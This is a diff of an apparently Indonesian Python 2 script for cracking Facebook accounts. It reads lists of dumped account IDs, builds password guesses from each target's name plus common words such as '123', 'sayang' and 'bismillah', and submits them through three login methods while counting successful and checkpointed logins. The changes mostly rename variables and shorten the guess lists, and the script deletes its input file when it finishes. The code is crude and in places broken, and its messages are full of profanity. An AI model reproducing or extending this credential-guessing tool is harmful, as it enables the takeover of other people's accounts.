@@ -207,8 +207,8 @@ class ngentod:
         except:
             print '\n%s╠══[!] File tidak ada, dump id dulu lah kentod'%(M)
             raw_input('\n%s╚══[ %sEnter %s] '%(P,K,P));menu()
-        aangxnisa = raw_input('%s╚══[?] ingin menggunakan password manual? [y/t] :%s '%(P,K))
-        if aangxnisa in ('Y', 'y'):
+        unikers = raw_input('%s╚══[?] ingin menggunakan password manual? [y/t] :%s '%(P,K))
+        if unikers in ('Y', 'y'):
             print '\n%s╔══[%s!%s] Gunakan (koma) untuk tanda pemisah '%(P,M,P,H,P)
             while True:
                 pwx = raw_input('%s╚══[?] password :%s '%(P,K))
@@ -217,7 +217,7 @@ class ngentod:
                 elif len(pwx)<=5:
                     print '%s╚══[!] password minimal 6 karakter ]'%(M)
                 else:
-                    def aangx(nisa_=None): 
+                    def zona(zafi_=None): 
                         ind = raw_input('\n%s╠══[?] metode : %s'%(P,K))
                         print '%s║%s'%(P)
                         if ind == '':
@@ -230,7 +230,7 @@ class ngentod:
                                 for akun in self.id:
                                     try:
                                         indo = akun.split('<=>')[0]
-                                        log.submit(self.b_api, indo, pantek_)
+                                        log.submit(self.b_api, indo, zafi_)
                                     except: pass
                             os.remove(self.apk);exit()
                         elif ind in ('2', '02'):
@@ -241,7 +241,7 @@ class ngentod:
                                 for akun in self.id:
                                     try:
                                         indo = akun.split('<=>')[0]
-                                        log.submit(self.basic, indo, pantek_)
+                                        log.submit(self.basic, indo, zafi_)
                                     except: pass
                             os.remove(self.apk);exit()
                         elif ind in ('3', '03'):
@@ -252,11 +252,11 @@ class ngentod:
                                 for akun in self.id:
                                     try:
                                         indo = akun.split('<=>')[0]
-                                        log.submit(self.mobil, indo, pantek_)
+                                        log.submit(self.mobil, indo, zafi_)
                                     except: pass
                             os.remove(self.apk);exit()
                         else:
-                            print ('\n %s╚═[•] isi yang benar kentod ]'%(M));nisa()
+                            print ('\n %s╚═[•] isi yang benar kentod ]'%(M));zona()
                     print '\n%s╔══[•] silahkan pilih metode crack ]\n'%(P)
                     print '%s║%s'%(P)
                     print '╠══[%s1%s] metode b-api [Kenceng Kaya Rosi]'%(K,P)
@@ -291,18 +291,18 @@ class ngentod:
                         _i_ = name.split(' ')
                         if len(_i_) == 3 or len(_i_) == 4 or len(_i_) == 5 or len(_i_) == 6:
                             pwx = [name, _i_[0]+"123", _i_[0]+"12345"]
-                            pwx = [name, _i_[0]+"123", _i_[0]+"sayang"]
-                            pwx = [name, _i_[0]+"123", _i_[0]+"anjing"]
-                            pwx = [name, _i_[0]+"123", _i_[0]+"bismillah"]
-                            pwx = [name, _i_[0]+"123", _i_[0]+"kontol"]
-                            pwx = [name, _i_[0]+"123", _i_[0]+"bajingan"]
+                            pwx = [name, _i_[0]+"sayang"]
+                            pwx = [name, _i_[0]+"anjing"]
+                            pwx = [name, _i_[0]+"bismillah"]
+                            pwx = [name, _i_[0]+"kontol"]
+                            pwx = [name, _i_[0]+"bajingan"]
                         else:
                             pwx = [name, _i_[0]+"123", _i_[0]+"12345"]
-                            pwx = [name, _i_[0]+"123", _i_[0]+"sayang"]
-                            pwx = [name, _i_[0]+"123", _i_[0]+"anjing"]
-                            pwx = [name, _i_[0]+"123", _i_[0]+"bismillah"]
-                            pwx = [name, _i_[0]+"123", _i_[0]+"kontol"]
-                            pwx = [name, _i_[0]+"123", _i_[0]+"bajingan"]
+                            pwx = [name, _i_[0]+"sayang"]
+                            pwx = [name, _i_[0]+"anjing"]
+                            pwx = [name, _i_[0]+"bismillah"]
+                            pwx = [name, _i_[0]+"kontol"]
+                            pwx = [name, _i_[0]+"bajingan"]
                         log.submit(self.b_api, uid, pwx)
                     except: pass
             os.remove(self.apk);exit()
@@ -317,18 +317,18 @@ class ngentod:
                         _i_ = name.split(' ')
                         if len(_i_) == 3 or len(_i_) == 4 or len(_i_) == 5 or len(_i_) == 6:
                             pwx = [name, _i_[0]+"123", _i_[0]+"12345"]
-                            pwx = [name, _i_[0]+"123", _i_[0]+"sayang"]
-                            pwx = [name, _i_[0]+"123", _i_[0]+"anjing"]
-                            pwx = [name, _i_[0]+"123", _i_[0]+"bismillah"]
-                            pwx = [name, _i_[0]+"123", _i_[0]+"kontol"]
-                            pwx = [name, _i_[0]+"123", _i_[0]+"bajingan"]
+                            pwx = [name, _i_[0]+"sayang"]
+                            pwx = [name, _i_[0]+"anjing"]
+                            pwx = [name, _i_[0]+"bismillah"]
+                            pwx = [name, _i_[0]+"kontol"]
+                            pwx = [name, _i_[0]+"bajingan"]
                         else:
                             pwx = [name, _i_[0]+"123", _i_[0]+"12345"]
-                            pwx = [name, _i_[0]+"123", _i_[0]+"sayang"]
-                            pwx = [name, _i_[0]+"123", _i_[0]+"anjing"]
-                            pwx = [name, _i_[0]+"123", _i_[0]+"bismillah"]
-                            pwx = [name, _i_[0]+"123", _i_[0]+"kontol"]
-                            pwx = [name, _i_[0]+"123", _i_[0]+"bajingan"]
+                            pwx = [name, _i_[0]+"sayang"]
+                            pwx = [name, _i_[0]+"anjing"]
+                            pwx = [name, _i_[0]+"bismillah"]
+                            pwx = [name, _i_[0]+"kontol"]
+                            pwx = [name, _i_[0]+"bajingan"]
                         log.submit(self.basic, uid, pwx)
                     except: pass
             os.remove(self.apk);exit()
@@ -343,24 +343,24 @@ class ngentod:
                         _i_ = name.split(' ')
                         if len(_i_) == 3 or len(_i_) == 4 or len(_i_) == 5 or len(_i_) == 6:
                             pwx = [name, _i_[0]+"123", _i_[0]+"12345"]
-                            pwx = [name, _i_[0]+"123", _i_[0]+"sayang"]
-                            pwx = [name, _i_[0]+"123", _i_[0]+"anjing"]
-                            pwx = [name, _i_[0]+"123", _i_[0]+"bismillah"]
-                            pwx = [name, _i_[0]+"123", _i_[0]+"kontol"]
-                            pwx = [name, _i_[0]+"123", _i_[0]+"bajingan"]
+                            pwx = [name, _i_[0]+"sayang"]
+                            pwx = [name, _i_[0]+"anjing"]
+                            pwx = [name, _i_[0]+"bismillah"]
+                            pwx = [name, _i_[0]+"kontol"]
+                            pwx = [name, _i_[0]+"bajingan"]
                         else:
                             pwx = [name, _i_[0]+"123", _i_[0]+"12345"]
-                            pwx = [name, _i_[0]+"123", _i_[0]+"sayang"]
-                            pwx = [name, _i_[0]+"123", _i_[0]+"anjing"]
-                            pwx = [name, _i_[0]+"123", _i_[0]+"bismillah"]
-                            pwx = [name, _i_[0]+"123", _i_[0]+"kontol"]
-                            pwx = [name, _i_[0]+"123", _i_[0]+"bajingan"]
+                            pwx = [name, _i_[0]+"sayang"]
+                            pwx = [name, _i_[0]+"anjing"]
+                            pwx = [name, _i_[0]+"bismillah"]
+                            pwx = [name, _i_[0]+"kontol"]
+                            pwx = [name, _i_[0]+"bajingan"]
                         log.submit(self.mobil, uid, pwx)
                     except: pass
             os.remove(self.apk);exit()
         else:
             print("%s╚══[•] Isi yang benar kentod ] "%(M));self.langsung()
-    def b_api(self, user, nisa):
+    def b_api(self, user, zona):
     	try:
     	    ua = open('data/ua.txt', 'r').read()
         except IOError:
@@ -414,7 +414,7 @@ class ngentod:
         rm = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m'])
         print "\r"+rm+"[Crack][%s/%s][OK>%s][CP>%s] "%(str(loping),len(mi),len(ok),len(cp)),
         sys.stdout.flush()
-    def basic(self, user, pantek):
+    def basic(self, user, zona):
         try:
     	    ua = open('data/ua.txt', 'r').read()
         except IOError:
@@ -473,7 +473,7 @@ class ngentod:
         rm = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m'])
         print "\r"+rm+"[Crack][%s/%s][OK>%s][CP>%s] "%(str(loping),len(mi),len(ok),len(cp)),
         sys.stdout.flush()
-    def mobil(self, user, pantek):
+    def mobil(self, user, zona):
         try:
     	    ua = open('data/ua.txt', 'r').read()
         except IOError:
@@ -534,7 +534,7 @@ class ngentod:
         sys.stdout.flush()
 def crack2(user, pwx):
 	global looping, loping
-	c_nisa_ = len(pwx)
+	c_bff_ = len(pwx)
 	for pas in pwx:
 		if looping != 1:
 			pass
@@ -543,7 +543,7 @@ def crack2(user, pwx):
 				rm = random.choice(["\033[1;91m","\033[1;92m","\033[1;93m","\033[1;94m","\033[1;95m","\033[1;96m","\033[1;97m"])
 				print "\r"+rm+"[Crack][%s/%s][OK>%s][CP>%s] "%(str(loping),len(mi),len(ok),len(cp)),
 				sys.stdout.flush()
-				c_nisa_ -= 1
+				c_bff_ -= 1
 			else:
 				pass
 		try:
